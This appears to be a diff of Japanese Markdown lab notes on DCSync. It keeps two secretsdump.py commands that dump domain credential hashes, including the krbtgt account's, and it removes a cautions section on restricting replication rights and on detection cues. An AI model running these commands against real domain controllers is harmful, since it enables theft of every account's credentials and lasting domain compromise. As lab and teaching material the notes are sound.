@@ -28,8 +28,3 @@ secretsdump.py lab.local/administrator@<DC_IP> -just-dc
 # 特定ユーザーのみ
 secretsdump.py -just-dc-user krbtgt lab.local/administrator@<DC_IP>
 ```
-
-## 注意点
-
-- 複製権限はドメイン管理者グループなど、ごく一部のアカウントにのみ持たせるべき強力な権限。ACL の棚卸しで、この権限が想定外のアカウントに付与されていないか定期的に確認する。
-- DCSync の実行は、正規の DC 間複製トラフィックと見分けがつきにくい面があるが、「DC ではないホストから複製要求が来る」「見慣れないアカウントが複製権限を行使する」といった点が検知の手がかりになる。
